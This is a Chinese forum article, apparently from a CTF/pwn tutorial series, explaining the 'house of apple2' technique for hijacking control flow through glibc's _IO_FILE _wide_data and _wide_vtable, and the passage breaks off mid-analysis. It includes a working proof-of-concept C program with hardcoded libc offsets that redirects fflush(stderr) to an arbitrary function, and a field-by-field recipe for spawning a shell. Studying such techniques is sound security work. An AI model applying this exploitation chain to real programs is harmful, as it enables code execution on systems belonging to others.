
- [例题分析](https://bbs.kanxue.com/#例题分析)
- [总结](https://bbs.kanxue.com/#总结)

# house of apple2

`house of apple`系列利用方法文章：

- [house of apple1](https://bbs.kanxue.com/thread-273418.htm)
- [house of apple2](https://bbs.pediy.com/thread-273832.htm)
- [house of apple3](https://bbs.kanxue.com/thread-273863.htm)

## 前言

之前提出了一种新的`IO`利用方法 [house of apple](https://bbs.pediy.com/thread-273418.htm)。本篇是`house of apple1`的续集，继续给出基于`IO_FILE->_wide_data`的利用技巧。

在 [house of apple1 的总结](https://bbs.pediy.com/thread-273418.htm#%E6%80%BB%E7%BB%93) 里面提到: `house of apple1` 的利用链可以在任意地址写堆地址，相当于一次`largebin attack`的效果。因此，`house of apple1` 需要和其他方法结合而进行后续的`FSOP`利用。

那么在只劫持`_wide_data`的条件下能不能控制程序的执行流呢？答案是肯定的。

本篇的`house of apple2`会提出几条新的`IO`利用链，在劫持`_IO_FILE->_wide_data`的基础上，直接控制程序执行流。

关于前置知识这里就不赘述了，详情可看 [house of apple1](https://bbs.kanxue.com/thread-273418.htm)。

## 利用条件

使用`house of apple2`的条件为：

- 已知`heap`地址和`glibc`地址
- 能控制程序执行`IO`操作，包括但不限于：从`main`函数返回、调用`exit`函数、通过`__malloc_assert`触发
- 能控制`_IO_FILE`的`vtable`和`_wide_data`，一般使用`largebin attack`去控制

## 利用原理

`stdin/stdout/stderr`这三个`_IO_FILE`结构体使用的是`_IO_file_jumps`这个`vtable`，而当需要调用到`vtable`里面的函数指针时，会使用宏去调用。以`_IO_file_overflow`调用为例，`glibc`中调用的代码片段分析如下

```c
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
```

其中，`IO_validate_vtable`函数负责检查`vtable`的合法性，会判断`vtable`的地址是不是在一个合法的区间。如果`vtable`的地址不合法，程序将会异常终止。

观察`struct _IO_wide_data`结构体，发现其对应有一个`_wide_vtable`成员。

```c
struct _IO_wide_data {
wchar_t *_IO_read_ptr; /* Current read pointer */
wchar_t *_IO_read_end; /* End of get area. */
wchar_t *_IO_read_base; /* Start of putback+get area. */
wchar_t *_IO_write_base; /* Start of put area. */
wchar_t *_IO_write_ptr; /* Current put pointer. */
wchar_t *_IO_write_end; /* End of put area. */
wchar_t *_IO_buf_base; /* Start of reserve area. */
wchar_t *_IO_buf_end; /* End of reserve area. */
/* The following fields are used to support backing up and undo. */
wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */
wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */
wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */
__mbstate_t _IO_state;
__mbstate_t _IO_last_state;
struct _IO_codecvt _codecvt;
wchar_t _shortbuf[1];
const struct _IO_jump_t *_wide_vtable;
};
```

在调用`_wide_vtable`虚表里面的函数时，同样是使用宏去调用，仍然以`vtable->_overflow`调用为例，所用到的宏依次为：

```c
#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
#define _IO_WIDE_JUMPS(THIS) \
_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
```

可以看到，在调用`_wide_vtable`里面的成员函数指针时，**没有关于vtable的合法性检查**。

因此，我们可以劫持`IO_FILE`的`vtable`为`_IO_wfile_jumps`，控制`_wide_data`为可控的堆地址空间，进而控制`_wide_data->_wide_vtable`为可控的堆地址空间。控制程序执行`IO`流函数调用，最终调用到`_IO_Wxxxxx`函数即可控制程序的执行流。

以下面提到的`_IO_wdefault_xsgetn`函数利用为例，编写`demo`示例如下：

```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void backdoor()
{
 printf("\033[31m[!] Backdoor is called!\n");
 _exit(0);
}

void main()
{
 setbuf(stdout, 0);
 setbuf(stdin, 0);
 setbuf(stderr, 0);

 char *p1 = calloc(0x200, 1);
 char *p2 = calloc(0x200, 1);
 puts("[*] allocate two 0x200 chunks");

 size_t puts_addr = (size_t)&puts;
 printf("[*] puts address: %p\n", (void *)puts_addr);
 size_t libc_base_addr = puts_addr - 0x84420;
 printf("[*] libc base address: %p\n", (void *)libc_base_addr);

 size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0;
 printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);

 size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e8c60;
 printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);

 char *stderr2 = (char *)_IO_2_1_stderr_addr;
 puts("[+] step 1: change stderr->_flags to 0x800");
 *(size_t *)stderr2 = 0x800;

 puts("[+] step 2: change stderr->_mode to 1");
 *(size_t *)(stderr2 + 0xc0) = 1;

 puts("[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20");
 *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20;

 puts("[+] step 4: replace stderr->_wide_data with the allocated chunk p1");
 *(size_t *)(stderr2 + 0xa0) = (size_t)p1;

 puts("[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2");
 *(size_t *)(p1 + 0xe0) = (size_t)p2;

 puts("[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base");
 *(size_t *)(p1 + 0x20) = (size_t)1;

 puts("[+] step 7: put backdoor at fake _wide_vtable->_overflow");
 *(size_t *)(p2 + 0x18) = (size_t)(&backdoor);

 puts("[+] step 8: call fflush(stderr) to trigger backdoor func");
 fflush(stderr);
}
```

编译后输出：

```
[*] allocate two 0x200 chunks
[*] puts address: 0x7f8f73d2e420
[*] libc base address: 0x7f8f73caa000
[*] _IO_2_1_stderr_ address: 0x7f8f73e975c0
[*] _IO_wstrn_jumps address: 0x7f8f73e92c60
[+] step 1: change stderr->_flags to 0x800
[+] step 2: change stderr->_mode to 1
[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20
[+] step 4: replace stderr->_wide_data with the allocated chunk p1
[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2
[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base
[+] step 7: put backdoor at fake _wide_vtable->_overflow
[+] step 8: call fflush(stderr) to trigger backdoor func
[!] Backdoor is called!
```

可以看到，成功调用了后门函数。

## 利用思路

目前在`glibc`源码中搜索到的`_IO_WXXXXX`系列函数的调用只有`_IO_WSETBUF`、`_IO_WUNDERFLOW`、`_IO_WDOALLOCATE`和`_IO_WOVERFLOW`。

其中`_IO_WSETBUF`和`_IO_WUNDERFLOW`目前无法利用或利用困难，其余的均可构造合适的`_IO_FILE`进行利用。这里给出我总结的几条比较好利用的链。以下使用`fp`指代`_IO_FILE`结构体变量。

### 利用 `_IO_wfile_overflow` 函数控制程序执行流

对`fp`的设置如下：

- `_flags`设置为`~(2 | 0x8 | 0x800)`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为 `sh;`，注意前面有两个空格
- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_write_base`设置为`0`，即满足`*(A + 0x18) = 0`
- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`

函数的调用链如下：

```
_IO_wfile_overflow
_IO_wdoallocbuf
_IO_WDOALLOCATE
*(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

详细分析如下：

首先看`_IO_wfile_overflow`函数
